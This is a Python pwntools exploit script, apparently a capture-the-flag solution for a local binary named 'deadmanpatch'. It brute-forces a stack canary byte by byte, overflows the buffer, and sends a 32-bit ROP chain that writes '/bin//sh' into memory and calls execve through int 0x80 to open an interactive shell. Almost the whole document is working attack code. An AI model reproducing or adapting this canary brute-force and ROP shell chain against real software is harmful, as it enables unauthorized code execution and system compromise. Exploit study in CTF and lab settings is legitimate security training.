#!/bin/python

from pwn import *
from struct import pack

# Padding goes here
p = b''

p += pack('<I', 0x08070c5a) # pop edx ; ret
p += pack('<I', 0x080ed060) # @ .data
p += pack('<I', 0x080ba3d6) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080562db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08070c5a) # pop edx ; ret
p += pack('<I', 0x080ed064) # @ .data + 4
p += pack('<I', 0x080ba3d6) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080562db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08070c5a) # pop edx ; ret
p += pack('<I', 0x080ed068) # @ .data + 8
p += pack('<I', 0x08049bc3) # xor eax, eax ; ret
p += pack('<I', 0x080562db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x080ed060) # @ .data
p += pack('<I', 0x08070c81) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ed068) # @ .data + 8
p += pack('<I', 0x080ed060) # padding without overwrite ebx
p += pack('<I', 0x08070c5a) # pop edx ; ret
p += pack('<I', 0x080ed068) # @ .data + 8

#p += pack('<I', 0x080BA3D6) # pop eax ; ret
#p += pack('<I', 0x080C30E0) # data 11 -4
#p += pack('<I', 0x0809EA40) # mov eax, dword ptr [eax + 4] ; ret



p += pack('<I', 0x0807c3bf) # inc eax ; ret
p += pack('<I', 0x0807c3bf) # inc eax ; ret
p += pack('<I', 0x0807c3bf) # inc eax ; ret
p += pack('<I', 0x0807c3bf) # inc eax ; ret
p += pack('<I', 0x0807c3bf) # inc eax ; ret
p += pack('<I', 0x0807c3bf) # inc eax ; ret
p += pack('<I', 0x0807c3bf) # inc eax ; ret
p += pack('<I', 0x0807c3bf) # inc eax ; ret
p += pack('<I', 0x0807c3bf) # inc eax ; ret
p += pack('<I', 0x0807c3bf) # inc eax ; ret
p += pack('<I', 0x0807c3bf) # inc eax ; ret
p += pack('<I', 0x0804e495) # int 0x80

p += pack('<I', 0x0807c3c0) # ret
p += pack('<I', 0x0807c3c0) # ret
p += pack('<I', 0x0807c3c0) # ret
p += pack('<I', 0x0807c3c0) # ret
p += pack('<I', 0x0807c3c0) # ret
p += pack('<I', 0x0807c3c0) # ret
p += pack('<I', 0x0807c3c0) # ret
p += pack('<I', 0x0807c3c0) # ret


# Here is the function to brute force the canary
def breakCanary():
	known_canary = b"\x00"
	test_canary = 0x0
	len_bytes_to_read = 0x22
	print(target.recv(timeout=2))
	time.sleep(1)
	for j in range(0, 3):
		# Iterate up to 0xff times to brute force all posible values for byte
		for test_canary in range(0xff):
			print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")
			target.send(len_bytes_to_read.to_bytes(1, "little"))
			target.send(b"A"*0x20 + known_canary + test_canary.to_bytes(1, "little"))
			output = target.recvuntil(b"tribute!\n")
			if (b"Got" in output):
				print(" - next byte is: " + hex(test_canary))
				known_canary = known_canary + test_canary.to_bytes(1, "little")
				len_bytes_to_read += 1
				break
	return known_canary




# Start the target process
target = process('./deadmanpatch')

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
#time.sleep(20)
time.sleep(5)
target.recv(timeout=5)
lennn = len(p) + 0x21
print(lennn)
target.send(lennn.to_bytes(1, "little"))
target.send(b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41")
target.send(canary)
target.send(b"000000000000")
target.send(p)
target.send(b"\n")
target.interactive()
print(target.recv(timeout=3))
